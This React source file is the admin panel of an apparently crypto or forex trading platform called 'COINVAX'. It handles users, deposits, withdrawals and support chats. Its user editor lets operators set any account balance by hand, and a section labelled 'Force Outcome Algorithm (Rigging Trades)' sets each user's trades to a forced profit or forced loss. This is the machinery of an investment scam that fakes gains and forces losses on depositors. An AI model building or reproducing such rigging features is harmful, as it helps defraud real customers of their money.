import React, { useState, useEffect } from 'react';
import { 
  db,
  collection, 
  onSnapshot, 
  doc, 
  updateDoc, 
  addDoc, 
  query, 
  where, 
  orderBy, 
  limit, 
  getDoc,
  runTransaction
} from '../firebase';
import { 
  Users, 
  ArrowDownToLine, 
  ArrowUpFromLine, 
  HeadphonesIcon, 
  Search, 
  Check, 
  X, 
  TrendingUp, 
  TrendingDown, 
  MinusCircle, 
  ShieldAlert, 
  Calendar, 
  User as UserIcon, 
  Wallet,
  Settings,
  RefreshCw,
  MessageSquare,
  ChevronRight,
  Sparkles,
  Phone
} from 'lucide-react';
import { cn } from '../lib/utils';
import { format } from 'date-fns';

interface AdminViewProps {
  currentUser: any;
  addNotification?: (title: string, message: string) => void;
  onClose: () => void;
}

export default function AdminView({ currentUser, addNotification, onClose }: AdminViewProps) {
  const [adminTab, setAdminTab] = useState<'USERS' | 'DEPOSITS' | 'WITHDRAWALS' | 'SUPPORT'>('USERS');
  
  // States for lists
  const [users, setUsers] = useState<any[]>([]);
  const [deposits, setDeposits] = useState<any[]>([]);
  const [withdrawals, setWithdrawals] = useState<any[]>([]);
  const [supportTickets, setSupportTickets] = useState<any[]>([]);
  
  // Loading state
  const [loading, setLoading] = useState(true);

  // Search filter
  const [searchQuery, setSearchQuery] = useState('');

  // Selected details
  const [selectedUser, setSelectedUser] = useState<any | null>(null);
  
  // User edit modal states
  const [editAllocations, setEditAllocations] = useState<Record<string, number>>({
    'Main Account': 0,
    'Trading Account': 0,
    'Options Account': 0,
    'P2P Account': 0
  });
  const [selectedOutcomeMode, setSelectedOutcomeMode] = useState<'normal' | 'force_profit' | 'force_loss'>('normal');
  const [isSavingUser, setIsSavingUser] = useState(false);

  // Selected support chat
  const [selectedTicket, setSelectedTicket] = useState<any | null>(null);
  const [chatMessages, setChatMessages] = useState<any[]>([]);
  const [adminReplyInput, setAdminReplyInput] = useState('');
  const [sendingReply, setSendingReply] = useState(false);

  // Fetch collections in real-time
  useEffect(() => {
    setLoading(true);
    
    // 1. Subscribe to users
    const unsbUsers = onSnapshot(collection(db, 'users'), (snapshot) => {
      const uList = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setUsers(uList);
      setLoading(false);
    }, (err) => console.error("Admin user listener error:", err));

    // 2. Subscribe to deposits
    const unsbDeposits = onSnapshot(query(collection(db, 'deposits'), orderBy('createdAt', 'desc'), limit(100)), (snapshot) => {
      const dList = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setDeposits(dList);
    }, (err) => console.error("Admin deposit listener error:", err));

    // 3. Subscribe to withdrawals
    const unsbWithdrawals = onSnapshot(query(collection(db, 'withdrawals'), orderBy('createdAt', 'desc'), limit(100)), (snapshot) => {
      const wList = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setWithdrawals(wList);
    }, (err) => console.error("Admin withdrawal listener error:", err));

    // 4. Subscribe to support tickets
    const unsbTickets = onSnapshot(query(collection(db, 'support_tickets'), orderBy('updatedAt', 'desc'), limit(100)), (snapshot) => {
      const tList = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setSupportTickets(tList);
    }, (err) => console.error("Admin tickets listener error:", err));

    return () => {
      unsbUsers();
      unsbDeposits();
      unsbWithdrawals();
      unsbTickets();
    };
  }, []);

  // Sync selected user when doc updates in database
  useEffect(() => {
    if (selectedUser) {
      const liveUser = users.find(u => u.uid === selectedUser.uid);
      if (liveUser) {
        setSelectedUser(liveUser);
        setEditAllocations(liveUser.allocations || {
          'Main Account': 0,
          'Trading Account': 0,
          'Options Account': 0,
          'P2P Account': 0
        });
        setSelectedOutcomeMode(liveUser.outcomeMode || 'normal');
      }
    }
  }, [users]);

  // Subscribe to support messages for chosen user ticket
  useEffect(() => {
    if (!selectedTicket) return;

    const messagesQuery = query(
      collection(db, 'support_tickets', selectedTicket.id, 'messages'),
      orderBy('createdAt', 'asc'),
      limit(200)
    );

    const unsubscribe = onSnapshot(messagesQuery, (snapshot) => {
      const msgs = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
      setChatMessages(msgs);
    });

    return () => unsubscribe();
  }, [selectedTicket]);

  // Helpers to resolve user data for nested listing (displays user mail/phone for simple identification)
  const getUserDisplayInfo = (uid: string) => {
    const matched = users.find(u => u.uid === uid);
    if (!matched) return { phone: 'Unknown User', email: 'N/A' };
    return {
      phone: matched.phone || matched.phoneNumber || 'N/A',
      email: matched.email || 'N/A',
      name: matched.displayName || `${matched.firstName || ''} ${matched.lastName || ''}`.trim() || 'N/A'
    };
  };

  // Transaction action handlers
  const handleApproveDeposit = async (dep: any) => {
    try {
      await runTransaction(db, async (transaction) => {
        const userRef = doc(db, 'users', dep.uid);
        const depRef = doc(db, 'deposits', dep.id);

        const userDoc = await transaction.get(userRef);
        if (!userDoc.exists()) throw new Error("User does not exist in database");

        const userData = userDoc.data();
        const currentAllocations = userData.allocations || {
          'Main Account': 0,
          'Trading Account': 0,
          'Options Account': 0,
          'P2P Account': 0
        };

        // Increment user's main wallet balance with deposit amount
        const updatedAllocations = {
          ...currentAllocations,
          'Main Account': (currentAllocations['Main Account'] || 0) + dep.amount
        };

        const totalBalance = Object.values(updatedAllocations).reduce((a, b) => (a as number) + (b as number), 0) as number;

        // Set updates as atomic transaction
        transaction.update(userRef, {
          allocations: updatedAllocations,
          balance: totalBalance
        });

        transaction.update(depRef, {
          status: 'APPROVED',
          updatedAt: Date.now()
        });
      });

      addNotification?.('Deposit Approved', `Approved $${dep.amount} deposit for user.`);
    } catch (e) {
      console.error("Failed to approve deposit:", e);
      alert("Error approving deposit: " + (e instanceof Error ? e.message : String(e)));
    }
  };

  const handleDenyDeposit = async (dep: any) => {
    try {
      await updateDoc(doc(db, 'deposits', dep.id), {
        status: 'DENIED',
        updatedAt: Date.now()
      });
      addNotification?.('Deposit Denied', `Rejected deposit of $${dep.amount}.`);
    } catch (e) {
      console.error("Failed to deny deposit:", e);
    }
  };

  const handleApproveWithdrawal = async (wd: any) => {
    try {
      // Direct update because withdrawal deduction already happens on user side creation
      await updateDoc(doc(db, 'withdrawals', wd.id), {
        status: 'APPROVED',
        updatedAt: Date.now()
      });
      addNotification?.('Withdrawal Approved', `Approved withdrawal of $${wd.amount} request.`);
    } catch (e) {
      console.error("Failed to approve withdrawal:", e);
    }
  };

  const handleDenyWithdrawal = async (wd: any) => {
    try {
      await runTransaction(db, async (transaction) => {
        const userRef = doc(db, 'users', wd.uid);
        const wdRef = doc(db, 'withdrawals', wd.id);

        const userDoc = await transaction.get(userRef);
        if (!userDoc.exists()) throw new Error("User does not exist in database");

        // Denials refund withdrawal deduction to client account
        const userData = userDoc.data();
        const currentAllocations = userData.allocations || {
          'Main Account': 0,
          'Trading Account': 0,
          'Options Account': 0,
          'P2P Account': 0
        };

        const updatedAllocations = {
          ...currentAllocations,
          'Main Account': (currentAllocations['Main Account'] || 0) + wd.amount
        };

        const totalBalance = Object.values(updatedAllocations).reduce((a, b) => (a as number) + (b as number), 0) as number;

        transaction.update(userRef, {
          allocations: updatedAllocations,
          balance: totalBalance
        });

        transaction.update(wdRef, {
          status: 'DISAPPROVED',
          refunded: true,
          updatedAt: Date.now()
        });
      });

      addNotification?.('Withdrawal Denied', `Refunded $${wd.amount} back to user wallet.`);
    } catch (e) {
      console.error("Failed to deny withdrawal:", e);
      alert("Error processing withdrawal denial: " + (e instanceof Error ? e.message : String(e)));
    }
  };

  // User Management actions
  const handleSaveUserConfig = async () => {
    if (!selectedUser) return;
    setIsSavingUser(true);
    try {
      const userRef = doc(db, 'users', selectedUser.uid);
      
      const totalBalance = Object.values(editAllocations).reduce((a, b) => (a as number) + (b as number), 0) as number;

      await updateDoc(userRef, {
        allocations: editAllocations,
        balance: totalBalance,
        outcomeMode: selectedOutcomeMode
      });

      addNotification?.('User Saved', `Changes applied to user configurations.`);
      // Refetch locally updated doc from list
    } catch (e) {
      console.error("Failed to save user settings:", e);
      alert("Save failed, verify permissions.");
    } finally {
      setIsSavingUser(false);
    }
  };

  // Support replies
  const handleSendAdminReply = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!adminReplyInput.trim() || !selectedTicket) return;

    setSendingReply(true);
    const text = adminReplyInput;
    setAdminReplyInput('');

    try {
      // Write message to user messages subcollection
      await addDoc(collection(db, 'support_tickets', selectedTicket.id, 'messages'), {
        userId: selectedTicket.id,
        sender: 'agent',
        text,
        createdAt: Date.now()
      });

      // Update main ticket
      await updateDoc(doc(db, 'support_tickets', selectedTicket.id), {
        lastMessage: text,
        updatedAt: Date.now()
      });

    } catch (e) {
      console.error("Error sending user reply: ", e);
    } finally {
      setSendingReply(false);
    }
  };

  // Filter lists based on query
  const filteredUsers = users.filter(u => {
    const q = searchQuery.toLowerCase();
    const phoneInfo = (u.phone || '').toString().toLowerCase();
    const emailInfo = (u.email || '').toString().toLowerCase();
    const nameInfo = `${u.firstName || ''} ${u.lastName || ''} ${u.displayName || ''}`.toLowerCase();
    return phoneInfo.includes(q) || emailInfo.includes(q) || nameInfo.includes(q) || u.uid.includes(q);
  });

  return (
    <div className="flex flex-col lg:flex-row h-[calc(100vh-140px)] bg-black border border-zinc-850 rounded-2xl overflow-hidden text-zinc-100 animate-in fade-in duration-300">
      
      {/* Left Sidebar tabs (Admin Navigation) */}
      <div className="w-full lg:w-64 bg-zinc-950 border-r border-zinc-850 flex flex-row lg:flex-col p-2 lg:p-4 gap-1 flex-shrink-0 overflow-x-auto selection:bg-emerald-500/30">
        <div className="hidden lg:flex items-center gap-2 px-3 py-2 mb-4 border-b border-zinc-800 pb-4">
          <Settings className="w-5 h-5 text-emerald-400 rotate-45" />
          <span className="font-sans font-black text-sm uppercase tracking-wider text-zinc-100">Control Panel</span>
        </div>

        <button 
          onClick={() => { setAdminTab('USERS'); setSelectedTicket(null); }}
          className={cn(
            "flex-1 lg:flex-none py-2 px-4 rounded-xl text-xs font-black uppercase tracking-wider text-left flex items-center justify-center lg:justify-start gap-2.5 transition-all duration-200 cursor-pointer",
            adminTab === 'USERS' ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/10" : "text-zinc-500 hover:text-zinc-100"
          )}
        >
          <Users className="w-4 h-4" />
          <span>Users ({users.length})</span>
        </button>

        <button 
          onClick={() => { setAdminTab('DEPOSITS'); setSelectedUser(null); setSelectedTicket(null); }}
          className={cn(
            "flex-1 lg:flex-none py-2 px-4 rounded-xl text-xs font-black uppercase tracking-wider text-left flex items-center justify-center lg:justify-start gap-2.5 transition-all duration-200 cursor-pointer",
            adminTab === 'DEPOSITS' ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/10" : "text-zinc-500 hover:text-zinc-100"
          )}
        >
          <ArrowDownToLine className="w-4 h-4" />
          <span>Deposits ({deposits.filter(d => d.status === 'PENDING').length})</span>
        </button>

        <button 
          onClick={() => { setAdminTab('WITHDRAWALS'); setSelectedUser(null); setSelectedTicket(null); }}
          className={cn(
            "flex-1 lg:flex-none py-2 px-4 rounded-xl text-xs font-black uppercase tracking-wider text-left flex items-center justify-center lg:justify-start gap-2.5 transition-all duration-200 cursor-pointer",
            adminTab === 'WITHDRAWALS' ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/10" : "text-zinc-500 hover:text-zinc-100"
          )}
        >
          <ArrowUpFromLine className="w-4 h-4" />
          <span>Withdrawals ({withdrawals.filter(w => w.status === 'PENDING').length})</span>
        </button>

        <button 
          onClick={() => { setAdminTab('SUPPORT'); setSelectedUser(null); }}
          className={cn(
            "flex-1 lg:flex-none py-2 px-4 rounded-xl text-xs font-black uppercase tracking-wider text-left flex items-center justify-center lg:justify-start gap-2.5 transition-all duration-200 cursor-pointer",
            adminTab === 'SUPPORT' ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/10" : "text-zinc-500 hover:text-zinc-100"
          )}
        >
          <HeadphonesIcon className="w-4 h-4" />
          <span>Support ({supportTickets.length})</span>
        </button>
      </div>

      {/* Right Content panel */}
      <div className="flex-1 bg-black flex flex-col min-w-0 overflow-y-auto">
        
        {loading ? (
          <div className="flex-1 flex flex-col items-center justify-center gap-2">
            <RefreshCw className="w-10 h-10 animate-spin text-zinc-700" />
            <p className="text-zinc-500 text-xs tracking-wider">Gathering system data...</p>
          </div>
        ) : (
          <div className="p-4 lg:p-6 flex flex-col h-full gap-4">
            
            {/* Tab Title / Head */}
            <div className="flex items-center justify-between pb-4 border-b border-zinc-900">
              <h2 className="text-xl font-bold uppercase tracking-tight flex items-center gap-2">
                {adminTab === 'USERS' && "User Directory"}
                {adminTab === 'DEPOSITS' && "Pending Deposit Slips"}
                {adminTab === 'WITHDRAWALS' && "Pending Withdrawal Requests"}
                {adminTab === 'SUPPORT' && "Dynamic Live Support Tickets"}
              </h2>
              {adminTab === 'USERS' && (
                <div className="relative w-64">
                  <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600" />
                  <input 
                    type="text" 
                    placeholder="Search phone or email..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className="w-full bg-zinc-950 border border-zinc-800 rounded-xl pl-10 pr-4 py-2 text-xs focus:outline-none focus:border-emerald-500 text-white placeholder-zinc-700 font-bold"
                  />
                </div>
              )}
            </div>

            {/* Contents Switch */}
            <div className="flex-1 min-h-0 flex flex-col lg:flex-row gap-6">
              
              {/* === USERS TAB === */}
              {adminTab === 'USERS' && (
                <>
                  {/* Left Column - Users List */}
                  <div className="flex-1 flex flex-col gap-2 min-h-0">
                    <div className="flex-1 overflow-y-auto pr-1 space-y-2 max-h-[500px]">
                      {filteredUsers.length === 0 ? (
                        <div className="text-zinc-500 text-xs py-8 text-center italic">No matching users found...</div>
                      ) : (
                        filteredUsers.map(u => (
                          <div 
                            key={u.uid}
                            onClick={() => setSelectedUser(u)}
                            className={cn(
                              "border rounded-xl p-3 flex items-center justify-between transition-all duration-200 cursor-pointer",
                              selectedUser?.uid === u.uid 
                                ? "bg-zinc-950/80 border-emerald-500/40 shadow-[0_0_15px_rgba(16,185,129,0.03)]" 
                                : "bg-zinc-950/20 border-zinc-850 hover:bg-zinc-950 hover:border-zinc-800"
                            )}
                          >
                            <div className="flex items-center gap-3">
                              <div className="w-9 h-9 rounded-full bg-zinc-900 border border-zinc-800 flex items-center justify-center flex-shrink-0">
                                <UserIcon className="w-4 h-4 text-zinc-500" />
                              </div>
                              <div className="min-w-0">
                                <p className="font-bold text-xs truncate max-w-[200px] text-white">
                                  {u.phone || u.phoneNumber || 'N/A'}
                                </p>
                                <p className="text-[10px] text-zinc-500 truncate max-w-[220px]">
                                  {u.email || 'N/A'} {u.displayName ? `(${u.displayName})` : ''}
                                </p>
                              </div>
                            </div>
                            <div className="text-right flex-shrink-0">
                              <p className="font-sans font-black text-xs text-emerald-400">
                                ${ (u.balance || 0).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) }
                              </p>
                              <span className={cn(
                                "text-[9px] uppercase tracking-wider font-extrabold px-1.5 py-0.5 rounded mt-1 inline-block",
                                u.outcomeMode === 'force_profit' ? "bg-emerald-500/10 text-emerald-400" :
                                u.outcomeMode === 'force_loss' ? "bg-rose-500/10 text-rose-400" : "bg-zinc-800 text-zinc-500"
                              )}>
                                {u.outcomeMode || 'normal'}
                              </span>
                            </div>
                          </div>
                        ))
                      )}
                    </div>
                  </div>

                  {/* Right Column - Selected User details */}
                  <div className="w-full lg:w-96 bg-zinc-950 border border-zinc-850 rounded-2xl p-4 flex flex-col gap-4">
                    {selectedUser ? (
                      <div className="space-y-4 animate-in fade-in duration-200">
                        {/* Title details */}
                        <div className="pb-3 border-b border-zinc-850">
                          <p className="text-[10px] uppercase font-bold text-zinc-500 tracking-wider">Currently Editing</p>
                          <h3 className="font-bold text-sm text-white truncate max-w-[340px] mt-1">{selectedUser.email || 'N/A'}</h3>
                          <p className="text-[10px] text-zinc-500 font-mono mt-1 select-all select-all flex items-center gap-1">
                            <span className="text-zinc-600 uppercase">UID:</span> {selectedUser.uid}
                          </p>
                        </div>

                        {/* Balance Edit Inputs */}
                        <div className="space-y-3">
                          <h4 className="text-[10px] text-zinc-400 font-black uppercase tracking-wider flex items-center gap-2 mb-2">
                            <Wallet className="w-3.5 h-3.5 text-emerald-400" />
                            Account Allocation Configuration
                          </h4>
                          
                          {['Main Account', 'Trading Account', 'Options Account', 'P2P Account'].map((walletName) => (
                            <div key={walletName} className="flex items-center gap-2 justify-between">
                              <span className="text-xs font-bold text-zinc-400">{walletName}</span>
                              <div className="flex items-center gap-1 bg-black border border-zinc-850 px-2.5 py-1.5 rounded-lg w-44">
                                <span className="text-[10px] text-zinc-600 font-bold">$</span>
                                <input 
                                  type="number"
                                  value={editAllocations[walletName] ?? 0}
                                  onChange={(e) => {
                                    const val = Math.max(0, parseFloat(e.target.value) || 0);
                                    setEditAllocations(prev => ({ ...prev, [walletName]: val }));
                                  }}
                                  className="w-full bg-transparent border-none text-xs text-white focus:outline-none text-right font-semibold"
                                />
                              </div>
                            </div>
                          ))}
                        </div>

                        {/* Outcome Mode manipulation */}
                        <div className="pt-3 border-t border-zinc-850">
                          <h4 className="text-[10px] text-zinc-400 font-black uppercase tracking-wider flex items-center gap-2 mb-3">
                            <Sparkles className="w-3.5 h-3.5 text-indigo-400" />
                            Force Outcome Algorithm (Rigging Trades)
                          </h4>

                          <div className="grid grid-cols-3 gap-2">
                            {[
                              { label: 'Normal', value: 'normal', color: 'bg-zinc-900 border-zinc-800 text-zinc-400 active:bg-zinc-800' },
                              { label: 'Profit', value: 'force_profit', color: 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400' },
                              { label: 'Loss', value: 'force_loss', color: 'bg-rose-500/10 border-rose-500/20 text-rose-500' }
                            ].map(opt => (
                              <button
                                key={opt.value}
                                onClick={() => setSelectedOutcomeMode(opt.value as any)}
                                className={cn(
                                  "py-2 rounded-xl text-xs font-black uppercase tracking-wider border cursor-pointer transition-all duration-200",
                                  selectedOutcomeMode === opt.value 
                                    ? opt.value === 'force_profit' ? "bg-emerald-500 border-emerald-500 text-zinc-950 font-black shadow-md shadow-emerald-500/10" 
                                      : opt.value === 'force_loss' ? "bg-rose-500 border-rose-500 text-zinc-950 font-black shadow-md shadow-rose-500/10"
                                      : "bg-white border-white text-zinc-950 font-black"
                                    : opt.color
                                )}
                              >
                                {opt.label}
                              </button>
                            ))}
                          </div>
                        </div>

                        <button 
                          onClick={handleSaveUserConfig}
                          disabled={isSavingUser}
                          className="w-full py-3 bg-emerald-500 hover:bg-emerald-400 text-zinc-950 font-black text-xs uppercase tracking-wider rounded-xl transition-all duration-200 flex items-center justify-center gap-1.5 shadow-[0_0_15px_rgba(16,185,129,0.15)] mt-4 cursor-pointer"
                        >
                          {isSavingUser ? "Saving Configurations..." : "Apply Configurations"}
                        </button>
                      </div>
                    ) : (
                      <div className="flex-1 flex flex-col items-center justify-center text-center gap-3 p-8">
                        <Users className="w-10 h-10 text-zinc-700 animate-pulse" />
                        <p className="text-zinc-500 text-xs tracking-wider">Select a user account from directory to view and manage balance structures.</p>
                      </div>
                    )}
                  </div>
                </>
              )}

              {/* === DEPOSITS TAB === */}
              {adminTab === 'DEPOSITS' && (
                <div className="flex-1 overflow-y-auto space-y-3 pr-1 max-h-[500px]">
                  {deposits.filter(d => d.status === 'PENDING').length === 0 ? (
                    <div className="text-zinc-500 text-xs py-12 text-center italic flex flex-col items-center gap-2">
                      <Check className="w-8 h-8 text-emerald-400 bg-emerald-500/10 p-1.5 rounded-full" />
                      All deposits caught up! No pending deposit slips.
                    </div>
                  ) : (
                    deposits.filter(d => d.status === 'PENDING').map(d => {
                      const uinfo = getUserDisplayInfo(d.uid);
                      return (
                        <div key={d.id} className="bg-zinc-950/70 border border-zinc-850 p-4 rounded-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 transition-all duration-200 hover:border-zinc-800">
                          <div className="space-y-1">
                            <div className="flex items-center gap-2">
                              <span className="font-sans font-black text-white text-sm">${d.amount.toLocaleString()}</span>
                              <span className="text-[10px] font-extrabold uppercase bg-emerald-500/15 text-emerald-400 px-2 py-0.5 rounded">
                                {d.method}
                              </span>
                            </div>
                            <p className="text-xs text-zinc-300 font-bold">User: {uinfo.phone} ({uinfo.email})</p>
                            <p className="text-[10px] text-zinc-500 flex items-center gap-1 font-mono">
                              <Calendar className="w-3.5 h-3.5" />
                              {format(new Date(d.createdAt), 'MMM dd, yyyy HH:mm:ss')}
                            </p>
                          </div>
                          
                          <div className="flex gap-2 self-end sm:self-center">
                            <button 
                              onClick={() => handleDenyDeposit(d)}
                              className="px-3.5 py-1.5 bg-rose-500/10 hover:bg-rose-500 hover:text-white text-rose-500 border border-rose-500/20 rounded-lg text-xs font-black uppercase tracking-wider transition-all duration-200 cursor-pointer"
                            >
                              <X className="w-4 h-4 inline-block mr-1 -mt-0.5" /> Reject
                            </button>
                            <button 
                              onClick={() => handleApproveDeposit(d)}
                              className="px-3.5 py-1.5 bg-emerald-500 hover:bg-emerald-400 text-zinc-950 rounded-lg text-xs font-black uppercase tracking-wider transition-all duration-200 cursor-pointer shadow-[0_0_12px_rgba(16,185,129,0.1)]"
                            >
                              <Check className="w-4 h-4 inline-block mr-1 -mt-0.5" /> Approve
                            </button>
                          </div>
                        </div>
                      );
                    })
                  )}
                </div>
              )}

              {/* === WITHDRAWALS TAB === */}
              {adminTab === 'WITHDRAWALS' && (
                <div className="flex-1 overflow-y-auto space-y-3 pr-1 max-h-[500px]">
                  {withdrawals.filter(w => w.status === 'PENDING').length === 0 ? (
                    <div className="text-zinc-500 text-xs py-12 text-center italic flex flex-col items-center gap-2">
                      <Check className="w-8 h-8 text-emerald-400 bg-emerald-500/10 p-1.5 rounded-full" />
                      All withdrawals caught up! No pending requests.
                    </div>
                  ) : (
                    withdrawals.filter(w => w.status === 'PENDING').map(w => {
                      const uinfo = getUserDisplayInfo(w.uid);
                      return (
                        <div key={w.id} className="bg-zinc-950/70 border border-zinc-850 p-4 rounded-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 transition-all duration-200 hover:border-zinc-800">
                          <div className="space-y-1">
                            <div className="flex items-center gap-2">
                              <span className="font-sans font-black text-white text-sm">${w.amount.toLocaleString()}</span>
                              <span className="text-[10px] font-extrabold uppercase bg-rose-500/15 text-rose-400 px-2 py-0.5 rounded">
                                {w.method}
                              </span>
                            </div>
                            <p className="text-xs text-zinc-300 font-bold">User: {uinfo.phone} ({uinfo.email})</p>
                            {w.mobileNumber && (
                              <p className="text-[11px] text-zinc-400 font-mono">Mobile Money No: {w.mobileNumber}</p>
                            )}
                            <p className="text-[10px] text-zinc-500 flex items-center gap-1 font-mono">
                              <Calendar className="w-3.5 h-3.5" />
                              {format(new Date(w.createdAt), 'MMM dd, yyyy HH:mm:ss')}
                            </p>
                          </div>
                          
                          <div className="flex gap-2 self-end sm:self-center">
                            <button 
                              onClick={() => handleDenyWithdrawal(w)}
                              className="px-3.5 py-1.5 bg-rose-500/10 hover:bg-rose-500 hover:text-white text-rose-500 border border-rose-500/20 rounded-lg text-xs font-black uppercase tracking-wider transition-all duration-200 cursor-pointer"
                            >
                              <X className="w-4 h-4 inline-block mr-1 -mt-0.5" /> Reject & Refund
                            </button>
                            <button 
                              onClick={() => handleApproveWithdrawal(w)}
                              className="px-3.5 py-1.5 bg-emerald-500 hover:bg-emerald-400 text-zinc-950 rounded-lg text-xs font-black uppercase tracking-wider transition-all duration-200 cursor-pointer shadow-[0_0_12px_rgba(16,185,129,0.1)]"
                            >
                              <Check className="w-4 h-4 inline-block mr-1 -mt-0.5" /> Complete
                            </button>
                          </div>
                        </div>
                      );
                    })
                  )}
                </div>
              )}

              {/* === SUPPORT TAB === */}
              {adminTab === 'SUPPORT' && (
                <>
                  {/* Left list of tickets */}
                  <div className="flex-1 lg:flex-none lg:w-80 flex flex-col gap-2 min-h-0">
                    <div className="overflow-y-auto pr-1 space-y-2 max-h-[500px]">
                      {supportTickets.length === 0 ? (
                        <div className="text-zinc-500 text-xs py-8 text-center italic">No support tickets found...</div>
                      ) : (
                        supportTickets.map(ticket => {
                          const uinfo = getUserDisplayInfo(ticket.id);
                          return (
                            <div 
                              key={ticket.id}
                              onClick={() => setSelectedTicket(ticket)}
                              className={cn(
                                "border rounded-xl p-3 cursor-pointer transition-all duration-200 select-none",
                                selectedTicket?.id === ticket.id 
                                  ? "bg-zinc-950/80 border-emerald-500/40 shadow-md"
                                  : "bg-zinc-950/20 border-zinc-850 hover:bg-zinc-950 hover:border-zinc-800"
                              )}
                            >
                              <div className="flex justify-between items-start">
                                <p className="font-bold text-xs truncate text-white">{uinfo.phone}</p>
                                <ChevronRight className="w-4 h-4 text-zinc-600" />
                              </div>
                              <p className="text-[10px] text-zinc-500 truncate max-w-[240px] mt-0.5">{uinfo.email}</p>
                              <p className="text-xs text-zinc-400 truncate mt-2 font-mono italic">
                                "{ticket.lastMessage || '...'}"
                              </p>
                              <p className="text-[9px] text-zinc-600 font-mono text-right mt-1">
                                {format(new Date(ticket.updatedAt || Date.now()), 'MMM dd, HH:mm')}
                              </p>
                            </div>
                          );
                        })
                      )}
                    </div>
                  </div>

                  {/* Right Chat interface */}
                  <div className="flex-1 bg-zinc-950 border border-zinc-850 rounded-2xl p-4 flex flex-col h-[500px]">
                    {selectedTicket ? (
                      <div className="flex flex-col h-full min-h-0 animate-in fade-in duration-200">
                        {/* Title details */}
                        <div className="pb-3 border-b border-zinc-900 mb-3 flex-shrink-0">
                          <p className="text-[10px] uppercase font-bold text-zinc-500 tracking-wider">Messaging user</p>
                          <h3 className="font-bold text-xs text-emerald-400 truncate max-w-[340px] mt-1">
                            {getUserDisplayInfo(selectedTicket.id).phone} ({getUserDisplayInfo(selectedTicket.id).email})
                          </h3>
                        </div>

                        {/* Message list window */}
                        <div className="flex-1 overflow-y-auto pr-1 space-y-3 mb-4 custom-scrollbar flex flex-col min-h-0">
                          {chatMessages.length === 0 ? (
                            <p className="text-zinc-600 text-xs italic m-auto">Loading message threads...</p>
                          ) : (
                            chatMessages.map(m => {
                              const isSelf = m.sender === 'agent';
                              return (
                                <div key={m.id} className={cn(
                                  "flex flex-col max-w-[80%]",
                                  isSelf ? "self-end items-end" : "self-start items-start"
                                )}>
                                  <div className={cn(
                                    "px-3.5 py-2.5 rounded-xl text-xs font-semibold leading-relaxed",
                                    isSelf 
                                      ? "bg-emerald-500 text-zinc-950 font-bold rounded-tr-none shadow-md shadow-emerald-500/5" 
                                      : "bg-zinc-900 text-zinc-200 rounded-tl-none border border-zinc-850"
                                  )}>
                                    {m.text}
                                  </div>
                                  <span className="text-[8px] text-zinc-600 font-mono mt-1">
                                    {isSelf ? "COINVAX Agent" : "User"}{' '}
                                    {m.createdAt ? `• ${format(new Date(m.createdAt), 'HH:mm')}` : ''}
                                  </span>
                                </div>
                              );
                            })
                          )}
                        </div>

                        {/* Sending inputs form */}
                        <form onSubmit={handleSendAdminReply} className="flex gap-2 flex-shrink-0 border-t border-zinc-900 pt-3">
                          <input 
                            type="text"
                            placeholder="Type a manual response to user..."
                            value={adminReplyInput}
                            onChange={(e) => setAdminReplyInput(e.target.value)}
                            className="flex-1 bg-black border border-zinc-850 rounded-xl px-4 py-3 text-xs focus:outline-none focus:border-indigo-500 text-white font-bold"
                          />
                          <button 
                            type="submit"
                            disabled={sendingReply || !adminReplyInput.trim()}
                            className="bg-emerald-500 hover:bg-emerald-400 disabled:bg-zinc-800 text-zinc-950 disabled:text-zinc-600 px-4 py-3 rounded-xl font-black text-xs uppercase tracking-wider transition-all duration-200 flex items-center justify-center cursor-pointer shadow-md"
                          >
                            Reply
                          </button>
                        </form>
                      </div>
                    ) : (
                      <div className="flex-1 flex flex-col items-center justify-center text-center gap-3 p-8">
                        <MessageSquare className="w-10 h-10 text-zinc-700 animate-pulse" />
                        <p className="text-zinc-500 text-xs tracking-wider">Select an active support ticket from the side directory to reply manually to customer queries.</p>
                      </div>
                    )}
                  </div>
                </>
              )}

            </div>

          </div>
        )}

      </div>
    </div>
  );
}
